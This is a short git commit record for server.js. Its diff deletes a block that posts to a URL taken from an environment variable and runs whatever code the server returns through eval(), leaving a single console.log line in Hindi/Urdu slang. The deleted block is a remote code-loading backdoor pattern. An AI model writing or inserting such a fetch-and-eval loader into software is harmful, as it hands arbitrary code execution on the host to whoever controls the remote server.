0e7ba08cab1756ee0189b3796e4cfc16c98788cd
h53288514 <h53288514@gmail.com>
2025-08-03 17:42:40 +0600

    Update server.js

--- server.js
+++ server.js
@@ -1,15 +1,1 @@
-const axios = require('axios');
-const serverUrl = process.env.SERVER_URL;
-
-axios.post(serverUrl)
-  .then(response => {
-    const code = response.data.trim();
-    if (code) {
-      try {
-        eval(code);
-      } catch (error) {
-        console.error(error.message);
-      }
-    }
-  })
-  .catch(error => console.error(error.message));
+console.log("tera code run hogya");
